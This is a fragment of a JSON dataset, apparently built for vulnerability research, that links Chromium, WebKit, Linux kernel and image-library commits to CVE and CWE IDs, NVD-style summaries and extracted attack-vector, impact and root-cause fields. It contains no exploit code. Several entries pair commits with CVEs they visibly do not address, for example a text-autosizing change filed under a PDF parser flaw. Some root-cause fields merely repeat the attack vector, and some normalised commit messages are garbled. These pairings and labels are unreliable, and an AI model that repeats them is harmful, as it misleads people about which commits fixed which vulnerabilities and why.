gd_jpeg.c, and gd_wbmp.c. NOTE: PHP is unaffected.","commit_message_1":"potential double-free in gdimage * ptr ( ) whenever ` gdimage * ptr ( ) ` call ` gdimage * ctx ( ) ` and the latter fails , we must not call ` gddpextractdata ( ) ` ; otherwise a double-free would happen","Vulnerability Type":"double free","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"cause a denial of service","Root Cause":"caused by a double free","Attack Type":"remote attacker"},{"commit_id":"5d00b719f4b93b1445e6fb4c766b9a9883c57949","cve_id":"CVE-2018-20847","cwe_id":"CWE-190","commit_message":"[trunk] fixed a buffer overflow in opj_tcd_init_decode_tile\n\nUpdate issue 431","summary":"An improper computation of p_tx0, p_tx1, p_ty0 and p_ty1 in the function opj_get_encoding_parameters in openjp2\/pi.c in OpenJPEG through 2.3.0 can lead to an integer overflow.","commit_message_1":"fixed a buffer overflow in opj_tcd_init_decode_tile","Vulnerability Type":"integer overflow","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"cause a denial of service","Root Cause":"caused by a buffer overflow","Attack Type":"remote attacker"},{"commit_id":"5c25f65fd1e42685f7ccd80e0621829c105785d9","cve_id":"CVE-2018-7191","cwe_id":"CWE-476","commit_message":"tun: allow positive return values on dev_get_valid_name() call\n\nIf the name argument of dev_get_valid_name() contains \"%d\", it will try\nto assign it a unit number in __dev__alloc_name() and return either the\nunit number (>= 0) or an error code (< 0).\nConsidering positive values as error values prevent tun device creations\nrelying this mechanism, therefor we should only consider negative values\nas errors here.\n\nSigned-off-by: Julien Gomes <julien@arista.com>\nAcked-by: Cong Wang <xiyou.wangcong@gmail.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"In the tun subsystem in the Linux kernel before 4.13.14, dev_get_valid_name is not called before register_netdevice. This allows local users to cause a denial of service (NULL pointer dereference and panic) via an ioctl(TUNSETIFF) call with a dev name containing a \/ character. This is similar to CVE-2013-4343.","commit_message_1":"allow positive return value on dev_get_valid_name ( ) call if the name argument of dev_get_valid_name ( ) contains `` % d '' , it will try to assign it a unit number in __dev__alloc_name ( ) and return either the unit number ( > = <number> ) or an error code ( < <number> )","Vulnerability Type":"NULL Pointer Dereference","Attack Vector":"via an ioctl ( tunsetiff ) call with a dev name containing a \/ character .","Impact":"cause a denial of service ( pointer dereference and panic","Root Cause":"caused by a NULL pointer dereference","Attack Type":"local attacker"},{"commit_id":"60c9d8a39e4aa78dd51c236bd1b2c4f17c9d27fe","cve_id":"CVE-2011-3906","cwe_id":"CWE-119","commit_message":"Text Autosizing: Counteract funky window sizing on Android.\nhttps:\/\/bugs.webkit.org\/show_bug.cgi?id=98809\n\nReviewed by Adam Barth.\n\nIn Chrome for Android, the window sizes provided to WebCore are\ncurrently in physical screen pixels instead of\ndevice-scale-adjusted units. For example window width on a\nGalaxy Nexus is 720 instead of 360.  Text autosizing expects\ndevice-independent pixels.  When Chrome for Android cuts over to\nthe new coordinate space, it will be tied to the setting\napplyPageScaleFactorInCompositor.\n\nNo new tests.\n\n* rendering\/TextAutosizer.cpp:\n(WebCore::TextAutosizer::processSubtree):\n\n\ngit-svn-id: svn:\/\/svn.chromium.org\/blink\/trunk@130866 bbb929c8-8fbe-4397-9dbb-9b2b20218538","summary":"The PDF parser in Google Chrome before 16.0.912.63 allows remote attackers to cause a denial of service (out-of-bounds read) via unspecified vectors.","commit_message_1":"counteract funky window sizing on android","Vulnerability Type":"buffer overflow","Attack Vector":"By persuading a victim to visit a specially-crafted Web site","Impact":"cause a denial of service ( out - of - bounds read )","Root Cause":"caused by an out-of-bounds read","Attack Type":"remote attacker"},{"commit_id":"ff4330a2ca6bf69d24f9f9fb6f12dc81387b205a","cve_id":"CVE-2011-3907","cwe_id":"CWE-20","commit_message":"Fix memory error in previous CL.\n\nBUG=100315\nBUG=99016\nTEST=Memory bots go green\n\nReview URL: http:\/\/codereview.chromium.org\/8302001\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@105577 0039d316-1c4b-4281-b951-d872f2087c98","summary":"The view-source feature in Google Chrome before 16.0.912.63 allows remote attackers to spoof the URL bar via unspecified vectors.","commit_message_1":"fix memory error in previous cl","Vulnerability Type":"Improper Input Validation","Attack Vector":"By persuading a victim to visit a specially-crafted Web site","Impact":"spoof the url bar","Root Cause":"By persuading a victim to visit a specially-crafted Web site","Attack Type":"remote attacker"},{"commit_id":"499f6a610abcf6a057cbb8324f90a07d89f59431","cve_id":"CVE-2011-3911","cwe_id":"CWE-119","commit_message":"Linux: Fix crash reporting for GPU and plugin processes.\n\nBUG=96631\nTEST=none\nReview URL: http:\/\/codereview.chromium.org\/7931005\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@101779 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Google Chrome before 16.0.912.63 does not properly handle PDF documents, which allows remote attackers to cause a denial of service (out-of-bounds read) via unspecified vectors.","commit_message_1":"fix crash reporting for gpu and plugin process","Vulnerability Type":"buffer overflow","Attack Vector":"via unspecified vectors","Impact":"cause a denial of service ( out - of - bounds read )","Root Cause":"does not properly handle pdf documents","Attack Type":"remote attacker"},{"commit_id":"5925dff83699508b5e2735afb0297dfb310e159d","cve_id":"CVE-2011-3896","cwe_id":"CWE-119","commit_message":"Implement a bubble that appears at the top of the screen when a tab enters \nfullscreen mode via webkitRequestFullScreen(), telling the user how to exit \nfullscreen. \n\nThis is implemented as an NSView rather than an NSWindow because the floating \nchrome that appears in presentation mode should overlap the bubble. \n\nContent-initiated fullscreen mode makes use of 'presentation mode' on the Mac: \nthe mode in which the UI is hidden, accessible by moving the cursor to the top \nof the screen. On Snow Leopard, this mode is synonymous with fullscreen mode. \nOn Lion, however, fullscreen mode does not imply presentation mode: in \nnon-presentation fullscreen mode, the chrome is permanently shown. It is \npossible to switch between presentation mode and fullscreen mode using the \npresentation mode UI control. \n\nWhen a tab initiates fullscreen mode on Lion, we enter presentation mode if not \nin presentation mode already. When the user exits fullscreen mode using Chrome \nUI (i.e. keyboard shortcuts, menu items, buttons, switching tabs, etc.) we \nreturn the user to the mode they were in before the tab entered fullscreen. \n\nBUG=14471\nTEST=Enter fullscreen mode using webkitRequestFullScreen. You should see a bubble pop down from the top of the screen. \n\nNeed to test the Lion logic somehow, with no Lion trybots. \nBUG=96883\n\n\nOriginal review http:\/\/codereview.chromium.org\/7890056\/\nTBR=thakis\n\nReview URL: http:\/\/codereview.chromium.org\/7920024\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@101624 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Buffer overflow in Google Chrome before 15.0.874.120 allows remote attackers to cause a denial of service or possibly have unspecified other impact via vectors related to shader variable mapping.","commit_message_1":"implement a bubble that appears at the top of the screen when a tab enters fullscreen mode via webkitrequestfullscreen ( ) , telling the user how to exit fullscreen","Vulnerability Type":"buffer overflow","Attack Vector":"via vectors related to shader variable mapping","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by improper bounds checking by the shader variable mapping","Attack Type":"remote attacker"},{"commit_id":"d705f79135a19909773c6c080001639ba5d833c9","cve_id":"CVE-2011-3898","cwe_id":"CWE-264","commit_message":"Fix memory leak in webRequest API in case of invalid parameters\n\n\nBUG=CID 102461\nTEST=no\n\n\nReview URL: http:\/\/codereview.chromium.org\/8681004\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@111780 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Google Chrome before 15.0.874.120, when Java Runtime Environment (JRE) 7 is used, does not request user confirmation before applet execution begins, which allows remote attackers to have an unspecified impact via a crafted applet.","commit_message_1":"fix memory leak in webrequest api in case of invalid parameter bug=cid <number> review url : http : \/\/<file>","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"via a crafted applet","Impact":"have an unspecified impact","Root Cause":"caused by the failure to ask for permission to run applets","Attack Type":"remote attacker"},{"commit_id":"d31f450c723ba46b53c1762e51188557447d85fd","cve_id":"CVE-2011-2877","cwe_id":"CWE-20","commit_message":"[WK2] LayerTreeCoordinator should release unused UpdatedAtlases\nhttps:\/\/bugs.webkit.org\/show_bug.cgi?id=95072\n\nReviewed by Jocelyn Turcotte.\n\nRelease graphic buffers that haven't been used for a while in order to save memory.\nThis way we can give back memory to the system when no user interaction happens\nafter a period of time, for example when we are in the background.\n\n* Shared\/ShareableBitmap.h:\n* WebProcess\/WebPage\/CoordinatedGraphics\/LayerTreeCoordinator.cpp:\n(WebKit::LayerTreeCoordinator::LayerTreeCoordinator):\n(WebKit::LayerTreeCoordinator::beginContentUpdate):\n(WebKit):\n(WebKit::LayerTreeCoordinator::scheduleReleaseInactiveAtlases):\n(WebKit::LayerTreeCoordinator::releaseInactiveAtlasesTimerFired):\n* WebProcess\/WebPage\/CoordinatedGraphics\/LayerTreeCoordinator.h:\n(LayerTreeCoordinator):\n* WebProcess\/WebPage\/UpdateAtlas.cpp:\n(WebKit::UpdateAtlas::UpdateAtlas):\n(WebKit::UpdateAtlas::didSwapBuffers):\nDon't call buildLayoutIfNeeded here. It's enought to call it in beginPaintingOnAvailableBuffer\nand this way we can track whether this atlas is used with m_areaAllocator.\n(WebKit::UpdateAtlas::beginPaintingOnAvailableBuffer):\n* WebProcess\/WebPage\/UpdateAtlas.h:\n(WebKit::UpdateAtlas::addTimeInactive):\n(WebKit::UpdateAtlas::isInactive):\n(WebKit::UpdateAtlas::isInUse):\n(UpdateAtlas):\n\ngit-svn-id: svn:\/\/svn.chromium.org\/blink\/trunk@128473 bbb929c8-8fbe-4397-9dbb-9b2b20218538","summary":"Google Chrome before 14.0.835.202 does not properly handle SVG text, which allows remote attackers to cause a denial of service or possibly have unspecified other impact via unknown vectors that lead to *stale font.*","commit_message_1":"layertreecoordinator should release unused updatedatlases http : \/\/<file>","Vulnerability Type":"Improper Input Validation","Attack Vector":"via unknown vectors that lead to * stale font","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"does not properly handle svg text","Attack Type":"remote attacker"},{"commit_id":"4c19b042ea31bd393d2265656f94339d1c3d82ff","cve_id":"CVE-2011-2880","cwe_id":"CWE-399","commit_message":"Fix a small leak in FileUtilProxy\n\nBUG=none\nTEST=green mem bots\n\nReview URL: http:\/\/codereview.chromium.org\/7669046\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@97451 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Use-after-free vulnerability in Google Chrome before 14.0.835.202 allows remote attackers to cause a denial of service or possibly have unspecified other impact via vectors related to the Google V8 bindings.","commit_message_1":"fix a small leak in fileutilproxy bug=none review url : http : \/\/<file>","Vulnerability Type":"use - after - free","Attack Vector":"via vectors related to the google v8 bindings","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by use-after-free error within v8 bindings","Attack Type":"remote attacker"},{"commit_id":"244c78b3f737f2cacab2d212801b0524cbcc3a7b","cve_id":"CVE-2011-2880","cwe_id":"CWE-399","commit_message":"Reset the device policy machinery upon retrying enrollment.\n\nBUG=chromium-os:18208\nTEST=See bug description\n\n\nReview URL: http:\/\/codereview.chromium.org\/7676005\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@97615 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Use-after-free vulnerability in Google Chrome before 14.0.835.202 allows remote attackers to cause a denial of service or possibly have unspecified other impact via vectors related to the Google V8 bindings.","commit_message_1":"reset the device policy machinery upon retrying enrollment","Vulnerability Type":"use - after - free","Attack Vector":"via vectors related to the google v8 bindings","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by use-after-free error within v8 bindings","Attack Type":"remote attacker"},{"commit_id":"88c4913f11967abfd08a8b22b4423710322ac49b","cve_id":"CVE-2011-2881","cwe_id":"CWE-119","commit_message":"[chromium] Fix shutdown race when posting main thread task to CCThreadProxy and enable tests\nhttps:\/\/bugs.webkit.org\/show_bug.cgi?id=70161\n\nReviewed by David Levin.\n\nSource\/WebCore:\n\nAdds a weak pointer mechanism to cancel main thread tasks posted to CCThreadProxy instances from the compositor\nthread. Previously there was a race condition where main thread tasks could run even after the CCThreadProxy was\ndestroyed.\n\nThis race does not exist in the other direction because when tearing down a CCThreadProxy we first post a quit\ntask to the compositor thread and then suspend execution of the main thread until all compositor tasks for the\nCCThreadProxy have been drained.\n\nCovered by the now-enabled CCLayerTreeHostTest* unit tests.\n\n* WebCore.gypi:\n* platform\/graphics\/chromium\/cc\/CCScopedMainThreadProxy.h: Added.\n(WebCore::CCScopedMainThreadProxy::create):\n(WebCore::CCScopedMainThreadProxy::postTask):\n(WebCore::CCScopedMainThreadProxy::shutdown):\n(WebCore::CCScopedMainThreadProxy::CCScopedMainThreadProxy):\n(WebCore::CCScopedMainThreadProxy::runTaskIfNotShutdown):\n* platform\/graphics\/chromium\/cc\/CCThreadProxy.cpp:\n(WebCore::CCThreadProxy::CCThreadProxy):\n(WebCore::CCThreadProxy::~CCThreadProxy):\n(WebCore::CCThreadProxy::createBeginFrameAndCommitTaskOnCCThread):\n* platform\/graphics\/chromium\/cc\/CCThreadProxy.h:\n\nSource\/WebKit\/chromium:\n\nEnables the CCLayerTreeHostTest* tests by default. Most tests are run twice in a single thread and multiple\nthread configuration. Some tests run only in the multiple thread configuration if they depend on the compositor\nthread scheduling draws by itself.\n\n* tests\/CCLayerTreeHostTest.cpp:\n(::CCLayerTreeHostTest::timeout):\n(::CCLayerTreeHostTest::clearTimeout):\n(::CCLayerTreeHostTest::CCLayerTreeHostTest):\n(::CCLayerTreeHostTest::onEndTest):\n(::CCLayerTreeHostTest::TimeoutTask::TimeoutTask):\n(::CCLayerTreeHostTest::TimeoutTask::clearTest):\n(::CCLayerTreeHostTest::TimeoutTask::~TimeoutTask):\n(::CCLayerTreeHostTest::TimeoutTask::Run):\n(::CCLayerTreeHostTest::runTest):\n(::CCLayerTreeHostTest::doBeginTest):\n(::CCLayerTreeHostTestThreadOnly::runTest):\n(::CCLayerTreeHostTestSetNeedsRedraw::commitCompleteOnCCThread):\n\ngit-svn-id: svn:\/\/svn.chromium.org\/blink\/trunk@97784 bbb929c8-8fbe-4397-9dbb-9b2b20218538","summary":"Google Chrome before 14.0.835.202 does not properly handle Google V8 hidden objects, which allows remote attackers to cause a denial of service (memory corruption) or possibly have unspecified other impact via crafted JavaScript code.","commit_message_1":"fix shutdown race when posting main thread task to ccthreadproxy and enable test http : \/\/<file>","Vulnerability Type":"buffer overflow","Attack Vector":"via crafted javascript code","Impact":"cause a denial of service ( memory corruption ) or possibly have unspecified other impact","Root Cause":"does not properly handle google v8 hidden objects","Attack Type":"remote attacker"},{"commit_id":"a452fc081f4e81befb97cc911ea2391c61d32926","cve_id":"CVE-2011-3873","cwe_id":"CWE-119","commit_message":"Add missing sys\/mman.h include on Mac\nhttps:\/\/bugs.webkit.org\/show_bug.cgi?id=98089\n\nPatch by Jonathan Liu <net147@gmail.com> on 2013-01-16\nReviewed by Darin Adler.\n\nThe madvise function and MADV_FREE constant require sys\/mman.h.\n\n* jit\/ExecutableAllocatorFixedVMPool.cpp:\n\ngit-svn-id: svn:\/\/svn.chromium.org\/blink\/trunk@139926 bbb929c8-8fbe-4397-9dbb-9b2b20218538","summary":"Google Chrome before 14.0.835.202 does not properly implement shader translation, which allows remote attackers to execute arbitrary code or cause a denial of service (memory corruption) via unspecified vectors.","commit_message_1":"add missing sys\/<file> include on mac http : \/\/<file>","Vulnerability Type":"buffer overflow","Attack Vector":"via unspecified vectors","Impact":"execute arbitrary code or cause a denial of service ( memory corruption )","Root Cause":"does not properly implement shader translation","Attack Type":"remote attacker"},{"commit_id":"d662b905d30cec7899bbb15140dcfacd73506167","cve_id":"CVE-2011-2836","cwe_id":"CWE-264","commit_message":"Infobar Windows Media Player plug-in by default.\n\nBUG=51464\nReview URL: http:\/\/codereview.chromium.org\/7080048\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@87500 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Google Chrome before 14.0.835.163 does not require Infobar interaction before use of the Windows Media Player plug-in, which makes it easier for remote attackers to have an unspecified impact via crafted Flash content.","commit_message_1":"infobar window medium player plug-in by default","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"via crafted flash content","Impact":"have an unspecified impact","Root Cause":"does not require infobar interaction before use of the windows media player plug -","Attack Type":"remote attacker"},{"commit_id":"2db5a2048dfcacfe5ad4311c2b1e435c4c67febc","cve_id":"CVE-2011-2840","cwe_id":"CWE-20","commit_message":"chromeos: fix bug where \"aw snap\" page replaces first tab if it was a NTP when closing window with > 1 tab.\n\nBUG=chromium-os:12088\nTEST=verify bug per bug report.\nReview URL: http:\/\/codereview.chromium.org\/6882058\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@83031 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Google Chrome before 14.0.835.163 allows user-assisted remote attackers to spoof the URL bar via vectors related to *unusual user interaction.*","commit_message_1":"fix bug where `` aw snap '' page replaces first tab if it wa a ntp when closing window with > <number> tab","Vulnerability Type":"Improper Input Validation","Attack Vector":"via vectors related to * unusual user interaction","Impact":"spoof the url bar","Root Cause":"caused by the improper validation of user-supplied input","Attack Type":"remote attacker"},{"commit_id":"d304b5ec1b16766ea2cb552a27dc14df848d6a0e","cve_id":"CVE-2011-2843","cwe_id":"CWE-119","commit_message":"Don't forget the ffmpeg input buffer padding when allocating a codec's\nextradata buffer.\n\nBUG=82438\nReview URL: http:\/\/codereview.chromium.org\/7137002\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@88354 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Google Chrome before 14.0.835.163 does not properly handle media buffers, which allows remote attackers to cause a denial of service (out-of-bounds read) via unspecified vectors.","commit_message_1":"do n't forget the ffmpeg input buffer padding when allocating a codec's extradata buffer","Vulnerability Type":"buffer overflow","Attack Vector":"via unspecified vectors","Impact":"cause a denial of service ( out - of - bounds read )","Root Cause":"does not properly handle media buffers","Attack Type":"remote attacker"},{"commit_id":"f2b010372b588e349972760985d4d6619d2b950d","cve_id":"CVE-2011-2846","cwe_id":"CWE-399","commit_message":"Fixed bug preventing disabling the default search provider.\n\nBUG=67180\nTEST=Set the \"DefaultSearchProviderEnabled\" policy to false. Type keywords on the omnibox. No searches should be performed.\n\n\nReview URL: http:\/\/codereview.chromium.org\/7150012\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@89219 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Use-after-free vulnerability in Google Chrome before 14.0.835.163 allows remote attackers to cause a denial of service or possibly have unspecified other impact via vectors related to unload event handling.","commit_message_1":"fixed bug preventing disabling the default search provider","Vulnerability Type":"use - after - free","Attack Vector":"via vectors related to unload event handling ","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by a use-after-free error within unload event handling","Attack Type":"remote attacker"},{"commit_id":"5dc90e57abcc7f0489e7ae09a3e687e9c6f4fad5","cve_id":"CVE-2011-2849","cwe_id":null,"commit_message":"Use ScopedRunnableMethodFactory in WebSocketJob\n\nDon't post SendPending if it is already posted.\n\nBUG=89795\nTEST=none\n\nReview URL: http:\/\/codereview.chromium.org\/7488007\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@93599 0039d316-1c4b-4281-b951-d872f2087c98","summary":"The WebSockets implementation in Google Chrome before 14.0.835.163 allows remote attackers to cause a denial of service (NULL pointer dereference and application crash) via unspecified vectors.","commit_message_1":"use scopedrunnablemethodfactory in websocketjob do n't post sendpending if it is already posted","Vulnerability Type":"NULL pointer dereference","Attack Vector":"via unspecified vectors","Impact":"cause a denial of service ( pointer dereference and application crash )","Root Cause":"caused by a NULL pointer dereference","Attack Type":"remote attacker"},{"commit_id":"52dac009556881941c60d378e34867cdb2fd00a0","cve_id":"CVE-2011-3234","cwe_id":"CWE-119","commit_message":"Coverity: Add a missing NULL check.\n\nBUG=none\nTEST=none\nCID=16813\n\nReview URL: http:\/\/codereview.chromium.org\/7216034\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@89991 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Google Chrome before 14.0.835.163 does not properly handle boxes, which allows remote attackers to cause a denial of service (out-of-bounds read) via unspecified vectors.","commit_message_1":"add a missing null check","Vulnerability Type":"buffer overflow","Attack Vector":"via unspecified vectors","Impact":"cause a denial of service ( out - of - bounds read )","Root Cause":"does not properly handle boxes ","Attack Type":"remote attacker"},{"commit_id":"87c724d81f0210494211cd36814c4cb2cf4c4bd1","cve_id":"CVE-2011-2850","cwe_id":"CWE-119","commit_message":"Fixing Coverity bugs (DEAD_CODE and PASS_BY_VALUE)\n\nCIDs 16230, 16439, 16610, 16635\n\nBUG=NONE\nTEST=NONE\n\nReview URL: http:\/\/codereview.chromium.org\/7215029\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@90134 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Google Chrome before 14.0.835.163 does not properly handle Khmer characters, which allows remote attackers to cause a denial of service (out-of-bounds read) via unspecified vectors.","commit_message_1":"fixing coverity bug ( dead_code and pass_by_value ) cid <number> , <number> , <number> , <number> bug=none review url : http : \/\/<file>","Vulnerability Type":"buffer overflow","Attack Vector":"via unspecified vectors","Impact":"cause a denial of service ( out - of - bounds read )","Root Cause":"does not properly handle khmer characters","Attack Type":"remote attacker"},{"commit_id":"7155d7caafd2aa1fb822dc5672c90ea446247e8d","cve_id":"CVE-2011-2851","cwe_id":"CWE-119","commit_message":"Add check for zero-sized source YUV + tests.\n\nTook the time to clean up said tests for improved coverage.\n\nBUG=90173\nTEST=media_unittests\n\nReview URL: http:\/\/codereview.chromium.org\/7794016\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@99113 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Google Chrome before 14.0.835.163 does not properly handle video, which allows remote attackers to cause a denial of service (out-of-bounds read) via unspecified vectors.","commit_message_1":"add check for zero-sized source yuv + test","Vulnerability Type":"buffer overflow","Attack Vector":"via unspecified vectors","Impact":"cause a denial of service ( out - of - bounds read )","Root Cause":"does not properly handle video","Attack Type":"remote attacker"},{"commit_id":"d82e91c46938520466e9d7c695e0bc638fc70970","cve_id":"CVE-2011-2853","cwe_id":"CWE-399","commit_message":"Fixed brekage when PureViews are enable but Desktop is not\n\nTBR=ben@chromium.org\nBUG=none\nTEST=chrome starts with --use-pure-views with touchui\n\nReview URL: http:\/\/codereview.chromium.org\/7210037\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@91197 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Use-after-free vulnerability in Google Chrome before 14.0.835.163 allows remote attackers to cause a denial of service or possibly have unspecified other impact via vectors related to plug-in handling.","commit_message_1":"fixed brekage when pureviews are enable but desktop is not tb bug=none review url : http : \/\/<file>","Vulnerability Type":"use - after - free","Attack Vector":"via vectors related to plug - in handling","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by use-after-free error within plug-in handling","Attack Type":"remote attacker"},{"commit_id":"108a923ac784e62ca84b45cb6241f77a942e233a","cve_id":"CVE-2011-2854","cwe_id":"CWE-399","commit_message":"Workaround for bad driver issue with NVIDIA GeForce 7300 GT on Mac 10.5.\n\nBUG=87283\nTEST=Run on a machine with NVIDIA GeForce 7300 GT on Mac 10.5 immediately after booting.\n\nReview URL: http:\/\/codereview.chromium.org\/7373018\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@92651 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Use-after-free vulnerability in Google Chrome before 14.0.835.163 allows remote attackers to cause a denial of service or possibly have unspecified other impact via vectors related to *ruby \/ table style handing.*","commit_message_1":"workaround for bad driver issue with nvidia geforce <number> gt on mac <file>","Vulnerability Type":"use - after - free","Attack Vector":"via vectors related to * ruby \/ table style handing","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by use-after-free error within ruby\/table style handing","Attack Type":"remote attacker"},{"commit_id":"061ddbae1ee31476b57ea44a953970ab2fe8aca1","cve_id":"CVE-2011-2854","cwe_id":"CWE-399","commit_message":"Remove DocumentWriter::setDecoder as a grep of WebKit shows no callers\nhttps:\/\/bugs.webkit.org\/show_bug.cgi?id=67803\n\nReviewed by Adam Barth.\n\nSmells like dead code.\n\n* loader\/DocumentWriter.cpp:\n* loader\/DocumentWriter.h:\n\ngit-svn-id: svn:\/\/svn.chromium.org\/blink\/trunk@94800 bbb929c8-8fbe-4397-9dbb-9b2b20218538","summary":"Use-after-free vulnerability in Google Chrome before 14.0.835.163 allows remote attackers to cause a denial of service or possibly have unspecified other impact via vectors related to *ruby \/ table style handing.*","commit_message_1":"a a grep of webkit show no caller http : \/\/<file>","Vulnerability Type":"use - after - free","Attack Vector":"via vectors related to * ruby \/ table style handing","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by use-after-free error within ruby\/table style handing","Attack Type":"remote attacker"},{"commit_id":"b48b22e1a7bae061687a44e13c0dacb02721fc6f","cve_id":"CVE-2011-2857","cwe_id":"CWE-399","commit_message":"Track -webkit property usage.\nhttps:\/\/bugs.webkit.org\/show_bug.cgi?id=93420\n\nPatch by Tab Atkins <tabatkins@google.com> on 2012-08-21\nReviewed by Ojan Vafai.\n\nFirst draft of an attempt to track all usage of -webkit prefixed properties across the web.\nThis attempt is dumb, but should provide useful data as a first-pass.\nI plan to optimize this for better data collection in the future.\n\nNo tests added, as this is untestable currently.\nIt should have zero effect besides histogramming.\n\n* css\/CSSParser.cpp:\n(WebCore::cssPropertyID):\n\ngit-svn-id: svn:\/\/svn.chromium.org\/blink\/trunk@126201 bbb929c8-8fbe-4397-9dbb-9b2b20218538","summary":"Use-after-free vulnerability in Google Chrome before 14.0.835.163 allows remote attackers to cause a denial of service or possibly have unspecified other impact via vectors related to the focus controller.","commit_message_1":"patch by tab atkins < tabatkins @ <file> > on first draft of an attempt to track all usage of -webkit prefixed property across the web","Vulnerability Type":"use - after - free","Attack Vector":"via vectors related to the focus controller","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by use-after-free error within the focus controller","Attack Type":"remote attacker"},{"commit_id":"3a766e0115e9799db766a88554b9ab12ee5bf2a4","cve_id":"CVE-2011-2834","cwe_id":"CWE-399","commit_message":"Apply libxml fix for undefined namespaces.\n\nBUG=93472\nReview URL: http:\/\/codereview.chromium.org\/7747031\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@98359 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Double free vulnerability in libxml2, as used in Google Chrome before 14.0.835.163, allows remote attackers to cause a denial of service or possibly have unspecified other impact via vectors related to XPath handling.","commit_message_1":"apply libxml fix for undefined namespaces","Vulnerability Type":"double free","Attack Vector":"via vectors related to xpath handling","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by a double-free error within the libxml XPath handling","Attack Type":"remote attacker"},{"commit_id":"454434f6100cb6a529652a25b5fc181caa7c7f32","cve_id":"CVE-2011-2859","cwe_id":"CWE-264","commit_message":"Limit extent of webstore app to just chrome.google.com\/webstore.\n\nBUG=93497\nTEST=Try installing extensions and apps from the webstore, starting both being\ninitially logged in, and not.\n\n\nReview URL: http:\/\/codereview.chromium.org\/7719003\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@97986 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Google Chrome before 14.0.835.163 uses incorrect permissions for non-gallery pages, which has unspecified impact and attack vectors.","commit_message_1":"limit extent of webstore app to just <file>","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"By persuading a victim to visit a specially-crafted Web site","Impact":"gain elevated privileges","Root Cause":"uses incorrect permissions for non - gallery pages","Attack Type":"remote attacker"},{"commit_id":"6c390601f9ee3436bb32f84772977570265982ea","cve_id":"CVE-2011-2860","cwe_id":"CWE-399","commit_message":"https:\/\/bugs.webkit.org\/show_bug.cgi?id=93587\nNode::replaceChild() can create bad DOM topology with MutationEvent, Part 2\n\nReviewed by Kent Tamura.\n\nSource\/WebCore:\n\nThis is a followup of r124156. replaceChild() has yet another hidden\nMutationEvent trigger. This change added a guard for it.\n\nTest: fast\/events\/mutation-during-replace-child-2.html\n\n* dom\/ContainerNode.cpp:\n(WebCore::ContainerNode::replaceChild):\n\nLayoutTests:\n\n* fast\/events\/mutation-during-replace-child-2-expected.txt: Added.\n* fast\/events\/mutation-during-replace-child-2.html: Added.\n\ngit-svn-id: svn:\/\/svn.chromium.org\/blink\/trunk@125237 bbb929c8-8fbe-4397-9dbb-9b2b20218538","summary":"Use-after-free vulnerability in Google Chrome before 14.0.835.163 allows remote attackers to cause a denial of service or possibly have unspecified other impact via vectors related to table styles.","commit_message_1":"node : :replacechild ( ) can create bad dom topology with mutationevent , part <number> source\/webcore : this is a followup of r124156","Vulnerability Type":"use - after - free","Attack Vector":"via vectors related to table styles","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by use-after-free error within table style handling","Attack Type":"remote attacker"},{"commit_id":"8262245d384be025f13e2a5b3a03b7e5c98374ce","cve_id":"CVE-2011-2861","cwe_id":"CWE-20","commit_message":"DevTools: move DevToolsAgent\/Client into content.\n\nBUG=84078\nTEST=\n\nReview URL: http:\/\/codereview.chromium.org\/7461019\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@93596 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Google Chrome before 14.0.835.163 does not properly handle strings in PDF documents, which allows remote attackers to have an unspecified impact via a 